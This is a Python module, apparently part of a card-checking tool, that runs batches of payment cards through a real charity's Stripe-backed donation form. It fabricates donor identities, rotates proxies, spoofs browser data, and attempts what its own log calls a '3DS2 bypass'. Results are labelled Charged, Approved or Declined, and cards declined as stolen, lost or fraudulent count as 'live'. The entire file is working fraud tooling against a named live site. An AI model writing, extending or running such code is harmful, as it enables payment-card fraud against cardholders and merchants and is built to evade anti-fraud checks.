import httpx
import random
import string
import time
import json
import re
import logging
import os
import base64

logger = logging.getLogger("inspire")

DONATE_URL = "https://foundation.inspirebrands.com"
DONATE_PAGE = f"{DONATE_URL}/donate-2/"
AJAX_URL = f"{DONATE_URL}/wp-admin/admin-ajax.php"
STRIPE_API = "https://api.stripe.com/v1"
STRIPE_PK = "pk_live_51IDaysFhvP6Zfk5TIzg66rASaWNpEJyPRbL5lmkbEe0z3g48xmfptIiPLfuCm90oZcd65n4k20V3ofTl9O9fMHAH00XakfHvTD"

FORM_ID = "942"
POST_ID = "932"

SITE_TIMEOUT = 20
STRIPE_TIMEOUT = 25

PROXY_FILE = os.path.join(os.path.dirname(os.path.dirname(__file__)), "proxy.txt")

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"

LIVE_DECLINES = [
    "insufficient_funds", "do_not_honor", "lost_card", "stolen_card",
    "pickup_card", "restricted_card", "security_violation",
    "incorrect_cvc", "invalid_cvc", "incorrect_zip",
    "card_velocity_exceeded", "withdrawal_count_limit_exceeded",
    "fraudulent",
]


def _random_email():
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@gmail.com"


def _random_name():
    first_names = ["James", "John", "Michael", "William", "David", "Robert", "Thomas", "Charles", "Chris", "Daniel"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Taylor", "Wilson", "Davies", "Evans", "Thomas"]
    return random.choice(first_names), random.choice(last_names)


def _get_global_proxy():
    try:
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, "r") as f:
                lines = [l.strip() for l in f if l.strip()]
            if lines:
                raw = random.choice(lines)
                parts = raw.split(":")
                if len(parts) == 4:
                    host, port, user, pwd = parts
                    return f"http://{user}:{pwd}@{host}:{port}"
                elif len(parts) == 2:
                    return f"http://{parts[0]}:{parts[1]}"
    except Exception:
        pass
    return None


def _classify_stripe_error(err, info, elapsed):
    code = err.get("code", "")
    decline = err.get("decline_code", "")
    msg = err.get("message", "")

    if decline in LIVE_DECLINES or code in LIVE_DECLINES:
        return f"Approved - {decline or code} | {info} [{elapsed}s]"
    if code == "card_declined":
        if decline:
            return f"Declined - {decline} | {info} [{elapsed}s]"
        return f"Declined - Card Declined | {info} [{elapsed}s]"
    if code == "expired_card":
        return f"Declined - Expired Card | {info} [{elapsed}s]"
    if code == "processing_error":
        return f"Declined - Processing Error | {info} [{elapsed}s]"
    return f"Declined - {code}: {msg[:60]} | {info} [{elapsed}s]"


def _extract_card_info(pm_data, last4):
    card_obj = pm_data.get("card", {})
    if card_obj:
        brand = card_obj.get("brand", "unknown").upper()
        last4_val = card_obj.get("last4", last4)
        funding = card_obj.get("funding", "unknown").upper()
        country = card_obj.get("country", "??")
        return f"{brand} {funding} | {country} | {last4_val}"
    return f"CARD | {last4}"


def _classify_3ds_result(resp, prefix):
    status = resp.get("status", "")
    if status == "succeeded":
        return f"Charged - {prefix} + Payment Successful $25"
    if status == "requires_capture":
        return f"Charged - {prefix} + Authorized $25"

    if "error" in resp:
        err = resp["error"]
        code = err.get("code", "")
        decline = err.get("decline_code", "")
        if decline in LIVE_DECLINES or code in LIVE_DECLINES:
            return f"Approved - {prefix} + {decline or code}"
        if code == "card_declined":
            return f"Declined - {prefix} + {decline or 'Card Declined'}"
        if code == "expired_card":
            return f"Declined - {prefix} + Expired Card"
        return f"Declined - {prefix} + {code}"

    if status == "requires_payment_method":
        last_error = resp.get("last_payment_error", {})
        if last_error:
            code = last_error.get("code", "")
            decline = last_error.get("decline_code", "")
            if decline in LIVE_DECLINES or code in LIVE_DECLINES:
                return f"Approved - {prefix} + {decline or code}"
            if code == "card_declined":
                return f"Declined - {prefix} + {decline or 'Card Declined'}"
            return f"Declined - {prefix} + {code}"
        return f"Declined - {prefix} + Payment Failed"

    return f"Approved - {prefix} (status: {status})"


async def _handle_3ds2(client, headers, source_id, sdk_data, client_secret, pi_id):
    browser_data = {
        "browser_java_enabled": "false",
        "browser_javascript_enabled": "true",
        "browser_language": "en-US",
        "browser_color_depth": "24",
        "browser_screen_height": "1080",
        "browser_screen_width": "1920",
        "browser_tz": str(random.choice([300, 360, 420, 480])),
        "browser_user_agent": UA,
        "browser_accept_header": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }

    one_click = {
        "one_click_authn_device_support[hosted]": "false",
        "one_click_authn_device_support[same_origin_frame]": "false",
        "one_click_authn_device_support[spc_eligible]": "false",
        "one_click_authn_device_support[passkey_eligible]": "false",
        "one_click_authn_device_support[publickey_credentials_get_allowed]": "true",
    }

    three_ds_method_url = sdk_data.get("three_ds_method_url", "")
    server_transaction_id = sdk_data.get("server_transaction_id", "")
    ds_trans_id = sdk_data.get("directory_server_transaction_id", "")

    fingerprint_data = {
        "source": source_id,
        "browser": json.dumps(browser_data),
        "key": STRIPE_PK,
    }
    fingerprint_data.update(one_click)

    try:
        r_fp = await client.post(f"{STRIPE_API}/3ds2/fingerprint", data=fingerprint_data, headers=headers)
        fp_resp = r_fp.json()
    except Exception as e:
        logger.info(f"3DS2 fingerprint failed: {e}")
        return None

    if "error" in fp_resp:
        return None

    fp_created_ds_trans = fp_resp.get("ds_trans_id", "") or fp_resp.get("directory_server_transaction_id", "")
    if fp_created_ds_trans:
        ds_trans_id = fp_created_ds_trans

    if three_ds_method_url and server_transaction_id:
        try:
            method_payload = {
                "threeDSServerTransID": server_transaction_id,
                "threeDSMethodNotificationURL": "https://hooks.stripe.com/3d_secure_2_return"
            }
            encoded_method = base64.urlsafe_b64encode(json.dumps(method_payload).encode()).decode().rstrip("=")
            await client.post(
                three_ds_method_url,
                data=f"threeDSMethodData={encoded_method}",
                headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": UA, "Origin": "https://js.stripe.com"},
            )
        except Exception:
            pass
        import asyncio
        await asyncio.sleep(1.5)

    auth_data = {
        "source": source_id,
        "browser": json.dumps(browser_data),
        "key": STRIPE_PK,
    }
    if server_transaction_id:
        auth_data["three_ds_server_trans_id"] = server_transaction_id
    if ds_trans_id:
        auth_data["ds_trans_id"] = ds_trans_id
    auth_data.update(one_click)

    try:
        r_auth = await client.post(f"{STRIPE_API}/3ds2/authenticate", data=auth_data, headers=headers)
        auth_resp = r_auth.json()
    except Exception as e:
        logger.info(f"3DS2 authenticate failed: {e}")
        return None

    if "error" in auth_resp:
        return None

    ares_status = ""
    ares = auth_resp.get("ares", {})
    if isinstance(ares, dict):
        ares_status = ares.get("transStatus", "")

    state = auth_resp.get("state", "")

    async def _reconfirm(label):
        reconfirm_data = {"key": STRIPE_PK, "client_secret": client_secret}
        try:
            r2 = await client.post(f"{STRIPE_API}/payment_intents/{pi_id}/confirm", data=reconfirm_data, headers=headers)
            resp2 = r2.json()
        except Exception:
            return None

        s2 = resp2.get("status", "")
        if s2 == "requires_action":
            try:
                r3 = await client.post(f"{STRIPE_API}/payment_intents/{pi_id}/confirm", data={"key": STRIPE_PK, "client_secret": client_secret}, headers=headers)
                resp2 = r3.json()
            except Exception:
                pass

        return _classify_3ds_result(resp2, label)

    if ares_status == "Y" or state == "succeeded":
        return await _reconfirm("3DS Passed")
    elif ares_status == "A":
        return await _reconfirm("3DS Attempted")
    elif ares_status in ("U", ""):
        return await _reconfirm("3DS Unavailable")
    elif ares_status in ("C", "D"):
        return await _reconfirm("3DS Challenge")
    elif ares_status == "N":
        return "Declined - 3DS Authentication Failed"
    elif ares_status == "R":
        return "Declined - 3DS Rejected"

    return None


async def _get_form_session(proxy=None):
    headers = {
        "User-Agent": UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }

    client_kwargs = dict(
        timeout=httpx.Timeout(SITE_TIMEOUT),
        max_redirects=10,
        headers=headers,
        follow_redirects=True,
    )
    if proxy:
        client_kwargs["proxy"] = proxy

    async with httpx.AsyncClient(**client_kwargs) as client:
        r = await client.get(DONATE_PAGE)
        if r.status_code != 200:
            return None, f"Donation page unavailable ({r.status_code})"

        html = r.text

        token_match = re.search(r'data-token="([^"]+)"', html)
        token_time_match = re.search(r'data-token-time="([^"]+)"', html)

        if not token_match or not token_time_match:
            return None, "Form tokens not found"

        pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', html)
        if not pk_match:
            return None, "Stripe PK not found on page"

        cookies = dict(r.cookies)

        return {
            "token": token_match.group(1),
            "token_time": token_time_match.group(1),
            "pk": pk_match.group(0),
            "cookies": cookies,
        }, None


async def inspire_check(cc, mm, yy, cvv, proxy=None):
    start = time.time()

    if len(yy) == 2:
        exp_year = f"20{yy}"
    else:
        exp_year = yy
    mm = mm.zfill(2)

    import datetime
    now = datetime.datetime.now()
    card_year = int(exp_year)
    card_month = int(mm)
    if card_year < now.year or (card_year == now.year and card_month < now.month):
        elapsed = round(time.time() - start, 2)
        return f"Declined - Expired Card | CARD | {cc[-4:]} [{elapsed}s]"

    last4 = cc[-4:]
    info = f"CARD | {last4}"

    session_data = None
    session_error = None

    proxies_to_try = []
    if proxy:
        proxies_to_try.append(proxy)
    global_proxy = _get_global_proxy()
    if global_proxy and global_proxy != proxy:
        proxies_to_try.append(global_proxy)
    proxies_to_try.append(None)

    for p in proxies_to_try:
        try:
            session_data, session_error = await _get_form_session(proxy=p)
            if session_data:
                break
        except (httpx.ConnectTimeout, httpx.ReadTimeout, httpx.WriteTimeout, httpx.PoolTimeout):
            session_error = "Connection timeout"
            continue
        except httpx.NetworkError:
            session_error = "Network error"
            continue
        except Exception as e:
            session_error = str(e)[:80]
            continue

    if not session_data:
        elapsed = round(time.time() - start, 2)
        return f"Error - {session_error or 'Site unreachable'} [{elapsed}s]"

    form_token = session_data["token"]
    form_token_time = session_data["token_time"]
    pk = session_data["pk"]

    first, last = _random_name()
    email = _random_email()
    postal = str(random.randint(10000, 99999))

    stripe_headers = {
        "User-Agent": UA,
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://js.stripe.com",
        "Referer": "https://js.stripe.com/",
        "Accept": "application/json",
    }

    try:
        async with httpx.AsyncClient(timeout=httpx.Timeout(STRIPE_TIMEOUT), follow_redirects=True) as stripe_client:

            pm_resp = await stripe_client.post(
                f"{STRIPE_API}/payment_methods",
                data={
                    "type": "card",
                    "card[number]": cc,
                    "card[exp_month]": mm,
                    "card[exp_year]": exp_year,
                    "card[cvc]": cvv,
                    "billing_details[name]": f"{first} {last}",
                    "billing_details[email]": email,
                    "billing_details[address][country]": "US",
                    "billing_details[address][postal_code]": postal,
                    "payment_user_agent": "stripe.js/b350feb82f; stripe-js-v3/b350feb82f; payment-element",
                    "time_on_page": str(random.randint(30000, 120000)),
                    "key": pk,
                },
                headers=stripe_headers,
            )
            pm_data = pm_resp.json()
            elapsed = round(time.time() - start, 2)

            if "error" in pm_data:
                err = pm_data["error"]
                code = err.get("code", "")
                decline = err.get("decline_code", "")
                msg = err.get("message", "")

                if code == "expired_card":
                    return f"Declined - Expired Card | {info} [{elapsed}s]"
                if code == "incorrect_number" or code == "invalid_number":
                    return f"Declined - Invalid Card Number | {info} [{elapsed}s]"
                if code == "invalid_expiry_month" or code == "invalid_expiry_year":
                    return f"Declined - Invalid Expiry | {info} [{elapsed}s]"
                if code == "card_declined":
                    if decline:
                        return f"Declined - {decline} | {info} [{elapsed}s]"
                    return f"Declined - Card Declined | {info} [{elapsed}s]"
                return f"Declined - {code}: {msg[:60]} | {info} [{elapsed}s]"

            pm_id = pm_data.get("id", "")
            if not pm_id:
                return f"Error - No PaymentMethod ID [{elapsed}s]"

            info = _extract_card_info(pm_data, last4)

            ajax_headers = {
                "User-Agent": UA,
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": DONATE_URL,
                "Referer": DONATE_PAGE,
                "Accept": "*/*",
            }

            form_data = {
                "wpforms[id]": FORM_ID,
                "wpforms[post_id]": POST_ID,
                "wpforms[fields][23][]": "One-time",
                "wpforms[fields][24]": "1",
                "wpforms[fields][12]": "0",
                "wpforms[fields][33]": "0",
                "wpforms[fields][3][first]": first,
                "wpforms[fields][3][last]": last,
                "wpforms[fields][5]": email,
                "wpforms[fields][20][address1]": f"{random.randint(100, 999)} Main St",
                "wpforms[fields][20][city]": "Atlanta",
                "wpforms[fields][20][state]": "GA",
                "wpforms[fields][20][postal]": postal,
                "wpforms[fields][18]": f"404{random.randint(1000000, 9999999)}",
                "wpforms[stripe-credit-card-cardname]": f"{first} {last}",
                "wpforms[submit]": "wpforms-submit",
                "wpforms[token]": form_token,
                "wpforms[token_time]": form_token_time,
                "wpforms[payment_method_id]": pm_id,
                "page_title": "Donate (Future)",
                "page_url": DONATE_PAGE,
                "page_id": POST_ID,
                "action": "wpforms_submit",
            }

            site_client_kwargs = dict(
                timeout=httpx.Timeout(SITE_TIMEOUT),
                follow_redirects=True,
            )
            if session_data.get("cookies"):
                site_client_kwargs["cookies"] = session_data["cookies"]

            async with httpx.AsyncClient(**site_client_kwargs) as site_client:
                ajax_resp = await site_client.post(AJAX_URL, data=form_data, headers=ajax_headers)
                elapsed = round(time.time() - start, 2)

                try:
                    ajax_data = ajax_resp.json()
                except Exception:
                    resp_text = ajax_resp.text[:200]
                    if "thank" in resp_text.lower() or "success" in resp_text.lower():
                        return f"Charged - Payment Successful $25 | {info} [{elapsed}s]"
                    return f"Error - Invalid AJAX response [{elapsed}s]"

                if ajax_data.get("success"):
                    data = ajax_data.get("data", {})

                    if data.get("action_required"):
                        client_secret = data.get("payment_intent_client_secret", "")
                        payment_method_id = data.get("payment_method_id", pm_id)

                        if client_secret:
                            pi_id = client_secret.split("_secret_")[0]

                            confirm_data = {
                                "payment_method": payment_method_id,
                                "key": pk,
                                "client_secret": client_secret,
                            }
                            r_confirm = await stripe_client.post(
                                f"{STRIPE_API}/payment_intents/{pi_id}/confirm",
                                data=confirm_data,
                                headers=stripe_headers,
                            )
                            confirm_resp = r_confirm.json()
                            elapsed = round(time.time() - start, 2)

                            if "error" in confirm_resp:
                                return _classify_stripe_error(confirm_resp["error"], info, elapsed)

                            status = confirm_resp.get("status", "")

                            if status == "succeeded":
                                return f"Charged - Payment Successful $25 | {info} [{elapsed}s]"

                            if status == "requires_action":
                                next_action = confirm_resp.get("next_action", {})
                                action_type = next_action.get("type", "")
                                if action_type == "use_stripe_sdk":
                                    sdk_data = next_action.get("use_stripe_sdk", {})
                                    sdk_type = sdk_data.get("type", "")
                                    source_id = sdk_data.get("three_d_secure_2_source", "")

                                    if sdk_type == "stripe_3ds2_fingerprint" and source_id:
                                        try:
                                            threeds_result = await _handle_3ds2(
                                                stripe_client, stripe_headers, source_id,
                                                sdk_data, client_secret, pi_id
                                            )
                                            if threeds_result:
                                                elapsed = round(time.time() - start, 2)
                                                return f"{threeds_result} | {info} [{elapsed}s]"
                                        except Exception as e:
                                            logger.info(f"3DS2 bypass failed: {e}")

                                    elapsed = round(time.time() - start, 2)
                                    return f"Approved - 3DS Required | {info} [{elapsed}s]"
                                return f"Approved - Action Required ({action_type}) | {info} [{elapsed}s]"

                            if status == "requires_capture":
                                return f"Charged - Payment Authorized $25 | {info} [{elapsed}s]"

                            if status == "requires_payment_method":
                                last_error = confirm_resp.get("last_payment_error", {})
                                if last_error:
                                    code = last_error.get("code", "")
                                    decline = last_error.get("decline_code", "")
                                    if decline in LIVE_DECLINES or code in LIVE_DECLINES:
                                        return f"Approved - {decline or code} | {info} [{elapsed}s]"
                                    if code == "card_declined":
                                        return f"Declined - {decline or 'Card Declined'} | {info} [{elapsed}s]"
                                    return f"Declined - {code} | {info} [{elapsed}s]"
                                return f"Declined - Payment Failed | {info} [{elapsed}s]"

                            return f"Declined - Status: {status} | {info} [{elapsed}s]"

                        return f"Approved - 3DS Required (no secret) | {info} [{elapsed}s]"

                    if data.get("confirmation") or data.get("location"):
                        return f"Charged - Payment Successful $25 | {info} [{elapsed}s]"

                    return f"Approved - Payment Submitted | {info} [{elapsed}s]"

                else:
                    data_obj = ajax_data.get("data", {})
                    err_text = ""

                    if isinstance(data_obj, dict):
                        errors = data_obj.get("errors", data_obj)
                        raw = json.dumps(errors)
                        html_msgs = re.findall(r'<p[^>]*>(.*?)</p>', raw, re.DOTALL)
                        if html_msgs:
                            err_text = "; ".join(re.sub(r'<[^>]+>', '', m).strip() for m in html_msgs)
                        else:
                            err_msgs = []
                            for field_id, msgs in errors.items():
                                if isinstance(msgs, list):
                                    err_msgs.extend(msgs)
                                elif isinstance(msgs, str):
                                    err_msgs.append(msgs)
                                elif isinstance(msgs, dict):
                                    for sub_key, sub_val in msgs.items():
                                        if isinstance(sub_val, str):
                                            clean = re.sub(r'<[^>]+>', '', sub_val).strip()
                                            if clean:
                                                err_msgs.append(clean)
                            err_text = "; ".join(err_msgs)[:100] if err_msgs else ""

                    if not err_text:
                        err_text = "Form validation failed"

                    err_lower = err_text.lower()

                    stripe_err = re.search(r'payment error:\s*(.+)', err_lower)
                    if stripe_err:
                        stripe_msg = stripe_err.group(1).strip().rstrip(".")

                        if any(d in stripe_msg for d in ["insufficient_funds", "insufficient funds",
                            "do_not_honor", "do not honor", "lost", "stolen",
                            "restricted", "fraudulent", "incorrect_cvc", "incorrect cvc",
                            "incorrect_zip", "incorrect zip"]):
                            return f"Approved - {stripe_msg.title()} | {info} [{elapsed}s]"
                        if "expired" in stripe_msg:
                            return f"Declined - Expired Card | {info} [{elapsed}s]"
                        if "declined" in stripe_msg:
                            return f"Declined - Card Declined | {info} [{elapsed}s]"
                        return f"Declined - {stripe_msg.title()[:60]} | {info} [{elapsed}s]"

                    if "card" in err_lower and ("declined" in err_lower or "error" in err_lower):
                        if any(d in err_lower for d in ["insufficient", "do_not_honor", "lost", "stolen", "restricted", "fraudulent"]):
                            return f"Approved - {err_text[:60]} | {info} [{elapsed}s]"
                        return f"Declined - {err_text[:60]} | {info} [{elapsed}s]"
                    if "expired" in err_lower:
                        return f"Declined - Expired Card | {info} [{elapsed}s]"

                    return f"Declined - {err_text[:80]} | {info} [{elapsed}s]"

    except (httpx.ConnectTimeout, httpx.ReadTimeout, httpx.WriteTimeout, httpx.PoolTimeout):
        elapsed = round(time.time() - start, 2)
        return f"Error - Stripe API Timeout [{elapsed}s]"
    except httpx.NetworkError:
        elapsed = round(time.time() - start, 2)
        return f"Error - Network Error [{elapsed}s]"
    except Exception as e:
        logger.warning(f"Unexpected error: {e}")
        elapsed = round(time.time() - start, 2)
        return f"Error - {str(e)[:80]} [{elapsed}s]"
